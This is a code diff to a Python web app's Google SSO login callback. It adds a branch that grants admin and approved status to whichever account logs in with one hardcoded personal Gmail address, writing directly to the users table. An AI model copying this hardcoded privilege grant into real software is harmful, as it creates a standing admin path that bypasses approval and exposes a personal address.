@@ -225,6 +225,17 @@ async def google_callback(request: Request):
             log.info("Creating new user for %s", user_info.email)
             # Use a simple placeholder for SSO users (we don't need a real hash since they login via Google)
             user = create_user(user_info.email, "GOOGLE_SSO_USER")
+        else:
+            # If the hardcoded super-admin logged in before we added the hardcode rule, upgrade them now
+            if user_info.email.lower() == "camadamdeardon@gmail.com" and not user.get("is_admin"):
+                from app.database import _conn
+                conn = _conn()
+                try:
+                    conn.execute("UPDATE users SET is_admin=1, is_approved=1 WHERE id=?", (user["id"],))
+                    conn.commit()
+                finally:
+                    conn.close()
+                user = get_user_by_email(user_info.email)
         
         token = create_access_token({"sub": str(user["id"])})
         
